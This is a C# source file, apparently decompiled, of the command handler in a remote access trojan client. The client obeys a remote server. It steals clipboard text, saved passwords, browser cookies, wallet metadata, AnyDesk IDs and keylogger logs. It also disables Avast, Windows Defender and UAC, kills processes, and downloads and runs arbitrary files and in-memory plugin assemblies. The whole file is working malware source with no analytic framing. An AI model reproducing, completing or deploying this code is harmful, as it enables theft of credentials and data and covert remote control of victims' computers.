using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Client.Connection;
using Client.Helper;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic;

namespace Client.Handle_Packet;

public static class Packet
{
	public static List<MsgPack> Packs = new List<MsgPack>();

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfo(int uAction, int uParam, int pvParam, int fWinIni);

	public static void Read(object data)
	{
		try
		{
			MsgPack unpack_msgpack = new MsgPack();
			unpack_msgpack.DecodeFromBytes((byte[])data);
			switch (unpack_msgpack.ForcePathObject("Packet").AsString)
			{
			case "pong":
			{
				ClientSocket.ActivatePong = false;
				MsgPack msgPack10 = new MsgPack();
				msgPack10.ForcePathObject("Packet").SetAsString("pong");
				msgPack10.ForcePathObject("Message").SetAsInteger(ClientSocket.Interval);
				ClientSocket.Send(msgPack10.Encode2Bytes());
				ClientSocket.Interval = 0;
				break;
			}
			case "plugin":
				try
				{
					if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null)
					{
						Packs.Add(unpack_msgpack);
						MsgPack msgPack11 = new MsgPack();
						msgPack11.ForcePathObject("Packet").SetAsString("sendPlugin");
						msgPack11.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
						ClientSocket.Send(msgPack11.Encode2Bytes());
					}
					else
					{
						Invoke(unpack_msgpack);
					}
					break;
				}
				catch (Exception ex)
				{
					Error(ex.Message);
					break;
				}
			case "savePlugin":
				SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
				{
					foreach (MsgPack item in Packs.ToList())
					{
						if (item.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
						{
							Invoke(item);
							Packs.Remove(item);
						}
					}
					break;
				}
			case "setxt":
			{
				new MsgPack();
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					string asString2 = unpack_msgpack.ForcePathObject("code").AsString;
					if (string.IsNullOrEmpty(asString2))
					{
						System.Windows.Forms.Clipboard.Clear();
					}
					else
					{
						System.Windows.Forms.Clipboard.SetText(asString2);
					}
				});
				thread2.SetApartmentState(ApartmentState.STA);
				thread2.Start();
				thread2.Join();
				break;
			}
			case "gettxt":
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					MsgPack msgPack12 = new MsgPack();
					msgPack12.ForcePathObject("Packet").SetAsString("cbget");
					msgPack12.ForcePathObject("Message").SetAsString(System.Windows.Forms.Clipboard.GetText());
					ClientSocket.Send(msgPack12.Encode2Bytes());
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
				break;
			}
			case "passload":
			{
				new MsgPack();
				MsgPack msgPack9 = new MsgPack();
				msgPack9.ForcePathObject("Packet").AsString = "AllInOne";
				msgPack9.ForcePathObject("Password").AsString = Plugins(Convert.FromBase64String(unpack_msgpack.ForcePathObject("Dll").AsString)).ToString();
				msgPack9.ForcePathObject("Hwid").AsString = Settings.Hwid;
				ClientSocket.Send(msgPack9.Encode2Bytes());
				break;
			}
			case "cookiesBrowser":
			{
				new MsgPack();
				MsgPack msgPack8 = new MsgPack();
				msgPack8.ForcePathObject("Packet").AsString = "cookiesBrowser";
				msgPack8.ForcePathObject("Cookies").AsString = Plugins(Convert.FromBase64String(unpack_msgpack.ForcePathObject("Dll").AsString)).ToString();
				msgPack8.ForcePathObject("Hwid").AsString = Settings.Hwid;
				ClientSocket.Send(msgPack8.Encode2Bytes());
				break;
			}
			case "getmeta":
			{
				new MsgPack();
				MsgPack msgPack7 = new MsgPack();
				msgPack7.ForcePathObject("Packet").AsString = "getmeta";
				msgPack7.ForcePathObject("getmeta").AsString = Plugins(Convert.FromBase64String(unpack_msgpack.ForcePathObject("Dll").AsString)).ToString();
				msgPack7.ForcePathObject("Hwid").AsString = Settings.Hwid;
				ClientSocket.Send(msgPack7.Encode2Bytes());
				break;
			}
			case "anydesk":
			{
				new MsgPack();
				MsgPack msgPack6 = new MsgPack();
				msgPack6.ForcePathObject("Packet").AsString = "anydesk";
				msgPack6.ForcePathObject("ID").AsString = Plugins(Convert.FromBase64String(unpack_msgpack.ForcePathObject("Dll").AsString)).ToString();
				ClientSocket.Send(msgPack6.Encode2Bytes());
				break;
			}
			case "ResetScale":
			{
				new MsgPack();
				MsgPack msgPack5 = new MsgPack();
				msgPack5.ForcePathObject("Packet").AsString = "loge";
				msgPack5.ForcePathObject("ID").AsString = "Reset Scale succeeded!";
				SystemParametersInfo(159, 0, 0, 1);
				ClientSocket.Send(msgPack5.Encode2Bytes());
				break;
			}
			case "killps":
				new MsgPack();
				KillPs(unpack_msgpack.ForcePathObject("PS").AsString);
				break;
			case "klget":
			{
				new MsgPack();
				string asString = File.ReadAllText(Environment.GetEnvironmentVariable("Temp") + "\\Log.tmp");
				MsgPack msgPack4 = new MsgPack();
				msgPack4.ForcePathObject("Packet").AsString = "klget";
				msgPack4.ForcePathObject("Logs").AsString = asString;
				msgPack4.ForcePathObject("Hwid").AsString = Settings.Hwid;
				ClientSocket.Send(msgPack4.Encode2Bytes());
				break;
			}
			case "Avast":
			{
				MsgPack msgPack3 = new MsgPack();
				object[] args = new object[1] { unpack_msgpack.ForcePathObject("Data").AsString };
				msgPack3.ForcePathObject("Packet").AsString = "loge";
				msgPack3.ForcePathObject("ID").AsString = Assembly.Load(Zip.Decompress(unpack_msgpack.ForcePathObject("Dll").GetAsBytes())).GetType("AVRemoval.Class1").InvokeMember("PL", BindingFlags.InvokeMethod, null, null, args)
					.ToString();
				ClientSocket.Send(msgPack3.Encode2Bytes());
				break;
			}
			case "weburl":
			{
				new MsgPack();
				using WebClient webClient = new WebClient();
				string fileName = Path.GetTempFileName() + "-" + unpack_msgpack.ForcePathObject("Ext").AsString;
				webClient.DownloadFile(unpack_msgpack.ForcePathObject("link").AsString, fileName);
				Process.Start(fileName);
				break;
			}
			case "WDExclusion":
			{
				new MsgPack();
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "loge";
				msgPack2.ForcePathObject("ID").AsString = Plugins(Zip.Decompress(unpack_msgpack.ForcePathObject("Dll").GetAsBytes())).ToString();
				ClientSocket.Send(msgPack2.Encode2Bytes());
				break;
			}
			case "uacoff":
			{
				new MsgPack();
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "loge";
				msgPack.ForcePathObject("ID").AsString = Plugins(Convert.FromBase64String(unpack_msgpack.ForcePathObject("Dll").AsString)).ToString();
				ClientSocket.Send(msgPack.Encode2Bytes());
				break;
			}
			}
		}
		catch (Exception ex2)
		{
			Error(ex2.Message);
		}
	}

	private static void Invoke(MsgPack unpack_msgpack)
	{
		dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))).GetType("Plugin.Plugin"));
		val.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
		Received();
	}

	private static void Received()
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "Received";
		ClientSocket.Send(msgPack.Encode2Bytes());
		Thread.Sleep(1000);
	}

	public static void Error(string ex)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "Error";
		msgPack.ForcePathObject("Error").AsString = ex;
		ClientSocket.Send(msgPack.Encode2Bytes());
	}

	public static void KillPs(string ps)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					string[] array = Strings.Split(ps, ",");
					foreach (string text in array)
					{
						if (process.ProcessName == text)
						{
							process.Kill();
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static object Plugins(byte[] B)
	{
		string result = "";
		try
		{
			Type[] types = AppDomain.CurrentDomain.Load(B).GetTypes();
			for (int i = 0; i < types.Length; i++)
			{
				MethodInfo[] methods = types[i].GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == "PL")
					{
						result = methodInfo.Invoke(null, null).ToString();
					}
				}
			}
			return result;
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}
}
